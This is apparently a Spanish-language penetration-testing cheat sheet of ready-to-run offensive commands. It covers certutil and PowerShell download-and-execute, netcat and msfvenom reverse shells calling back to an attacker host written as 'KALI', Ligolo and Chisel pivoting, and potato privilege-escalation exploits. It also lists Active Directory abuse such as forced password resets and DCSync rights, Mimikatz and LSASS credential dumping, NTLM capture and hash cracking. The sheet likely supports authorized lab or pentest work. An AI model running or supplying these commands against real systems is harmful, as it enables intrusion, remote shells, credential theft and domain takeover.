---
title: Binarios y herramientas (LOLbins, transfer, pivoting, cracking)
slug: gtfobins-binaries
category: tools
updated: 2026-06-30
summary: "LOLbins: transfers, shells, pivoting, potatoes, AD enum, cracking"
tags: [gtfobins, lolbins, transfer, pivoting, ligolo, impacket, cracking, mimikatz]
sensitive: false
---

# Binarios y herramientas (LOLbins, transfer, pivoting, cracking)

## When to use
Referencia de comando + ruta en Kali para transferencia, shells, pivoting, privesc Windows, enum AD, post-explotación y cracking. Sustituye `KALI` por tu IP.

## Transferencia y shells
```bash
# nc.exe: /usr/share/windows-resources/binaries/nc.exe
certutil -urlcache -f http://KALI/nc.exe C:\Temp\nc.exe   # subir a Windows
nc.exe KALI 4444 -e cmd.exe ;  nc -lvnp 4444              # listener Kali
# Nishang revshell:
echo "Invoke-PowerShellTcp -Reverse -IPAddress KALI -Port 4444" >> Invoke-PowerShellTcp.ps1
powershell IEX (New-Object Net.WebClient).DownloadString("http://KALI/shell.ps1")
# Web shells: /usr/share/webshells/php/  → bypass ext: .php5 .phtml .phar, GIF89a+php
```
```bash
# msfvenom
msfvenom -p windows/x64/shell_reverse_tcp LHOST=KALI LPORT=4444 -f exe -o shell.exe
msfvenom -p windows/x64/shell_reverse_tcp LHOST=KALI LPORT=4444 -f msi -o evil.msi   # AlwaysInstallElevated
msfvenom -p java/jsp_shell_reverse_tcp LHOST=KALI LPORT=4444 -f war -o shell.war     # Tomcat
msfvenom -p linux/x64/shell_reverse_tcp LHOST=KALI LPORT=4444 -f elf -o shell.elf
```

## Pivoting / tunneling
```bash
# Ligolo-ng (preferido)
sudo ip tuntap add user root mode tun ligolo && sudo ip link set ligolo up
./proxy -selfcert -laddr 0.0.0.0:11601
/tmp/agent -connect KALI:11601 -ignore-cert &          # en target Linux
# consola: session ; start ; start --tun ligolo2 ; listener_add --addr 0.0.0.0:P --to T:P
sudo ip route add 172.16.1.0/24 dev ligolo
# Chisel
chisel server -p 8001 --reverse ; ./chisel client KALI:8001 R:socks
# SSH: ssh -D 127.0.0.1:1080 USER@PIVOT -N -f ; ssh -L 8080:INT:80 USER@PIVOT -N
```

## Escalación Windows (potatoes)
```bash
.\JuicyPotato.exe -t * -p cmd.exe -a "/c nc.exe KALI 4444 -e cmd.exe" -l 9999 -c "{CLSID}"  # <2019
.\GodPotato-NET4.exe -cmd "cmd /c nc.exe KALI 4444 -e cmd.exe"   # Server 2012-2022, Win8-11
.\PrintSpoofer.exe -c "nc.exe KALI 4444 -e cmd.exe"             # Win10/Server2019
.\SweetPotato.exe -e EfsRpc -p nc.exe -a "KALI 4444 -e cmd"
# Todos requieren SeImpersonate/SeAssignPrimaryToken
```

## Enumeración AD
```bash
bloodhound-python -u USER -p PASS -d DOMAIN.local -ns DC_IP -c All --zip   # ITERATIVO: re-recolectar tras cada edge
# machine account vale: bloodhound-python -u 'SRV01$' --hashes :NTHASH -d D -ns IP -c All
bloodyAD -u U -p P -d D --dc-ip IP get writable          # qué controlo
bloodyAD -u U -p P -d D --dc-ip IP set password TARGET 'Hacked123!'   # ForceChangePassword
bloodyAD -u U -p P -d D --dc-ip IP add groupMember "GRUPO" usuario     # AddMember
dacledit.py -action write -rights FullControl -principal U -target 'DC01$' 'D/U:PASS'  # WriteDacl→DCSync
python3 ciscot7.py -d -p 0822455D0A16   # Cisco Type 7 (XOR de clave fija, reversible)
sudo responder -I eth0 -dwv             # captura NTLMv2
pypykatz lsa minidump lsass.dmp         # parsear LSASS sin mimikatz (EDR)
certipy-ad find -u U@DOMAIN -p PASS -dc-ip IP -vulnerable -stdout   # AD CS
```

## Post-explotación
```bash
# Mimikatz: privilege::debug ; sekurlsa::logonpasswords ; lsadump::dcsync /domain:D /user:Administrator
# Mimikatz PTH: sekurlsa::pth /user:Administrator /domain:D /ntlm:HASH /run:cmd.exe
wget http://KALI/linpeas.sh -O /tmp/linpeas.sh; chmod +x /tmp/linpeas.sh; /tmp/linpeas.sh 2>/dev/null | tee out.txt
/tmp/pspy64 -pf -i 1000   # monitoreo de procesos sin root
```

## Cracking
```bash
hashcat -m 1000 hash rockyou.txt    # NTLM      | -m 5600 NTLMv2 | -m 13100 Kerberoast | -m 18200 AS-REP
hashcat -m 1000 hash rockyou.txt -r /usr/share/hashcat/rules/best64.rule
john --wordlist=rockyou.txt hash.txt ; john --show hash.txt
# *2john (doble cifrado anidado): extraer → crackear → descifrar → repetir
python3 /usr/share/john/axcrypt2john.py backup.axx > backup.hash   # AxCrypt
office2john Creds.one > one.hash                                   # OneNote/Office
python3 /usr/share/john/ansible2john.py vault.yml > vault.hash     # Ansible Vault
```

## Impacket — referencia
| Tool | Comando base |
|---|---|
| psexec/wmiexec/smbexec | `impacket-TOOL USER:PASS@TARGET` (PTH: `-hashes :NTHASH`) |
| secretsdump | `impacket-secretsdump USER:PASS@TARGET` |
| GetNPUsers | `impacket-GetNPUsers DOMAIN/ -no-pass -usersfile users.txt` |
| GetUserSPNs | `impacket-GetUserSPNs DOMAIN/USER:PASS -request` |
| lookupsid / ticketer | enum SIDs / Golden-Silver tickets |

## Servidor HTTP en Kali
```bash
python3 -m http.server 80        # o php -S 0.0.0.0:80 (Windows que bloquean Python UA)
```

## Gotchas
- Ligolo: TCP-sobre-TCP se satura — escanear con `--min-rate 500 -T3`; con Ligolo activo NO uses proxychains.
- Dual-NIC en un host = puente entre forests (segundo agente Ligolo + `ip route add`).
- BloodHound es iterativo: Mark as Owned → Shortest Path → explotar 1 edge → RE-RECOLECTAR.
- `dacledit` target = objeto COMPUTER `DC01$`, no `CN=Users` (trampa visual del path).
- `$axcrypt$*2*`: el `2` es subtipo de hash, NO versión del archivo.
- JuicyPotato no funciona en Server 2019 / Win10 1809+ → usar GodPotato/PrintSpoofer.

## References
- Relacionado: [[reverse-shells]], [[password-cracking]], [[privilege-escalation]], [[netexec-crackmapexec]], [[network-pivoting]], [[active-directory-attacks]]
- 04_CHEATSHEET_BINARIOS.md
